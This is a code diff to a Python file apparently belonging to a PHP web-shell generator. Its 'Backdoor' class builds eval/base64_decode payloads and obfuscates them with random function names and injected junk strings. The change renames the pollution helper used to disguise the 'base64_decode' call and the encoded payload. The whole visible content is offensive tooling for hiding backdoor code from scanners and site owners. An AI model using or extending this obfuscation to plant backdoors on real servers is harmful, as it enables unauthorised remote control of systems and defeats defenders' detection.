@@ -18,7 +18,7 @@
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 import base64, codecs
 from random import random, randrange, choice, shuffle
-from pollution import random_string, pollute_string
+from pollution import random_string, pollute_with_static_str
 
 class Backdoor:
 #	payload_template_old= """
@@ -85,10 +85,10 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 	def encode_template(self):
 		
 		b64_new_func_name = random_string()
-		b64_pollution, b64_polluted = pollute_string('base64_decode',frequency=0.7)
+		b64_pollution, b64_polluted = pollute_with_static_str('base64_decode',frequency=0.7)
 		
 		payload_var = random_string()
-		payload_pollution, payload_polluted = pollute_string(base64.b64encode(self.payload))
+		payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
 		
 		replace_new_func_name = random_string()
 		
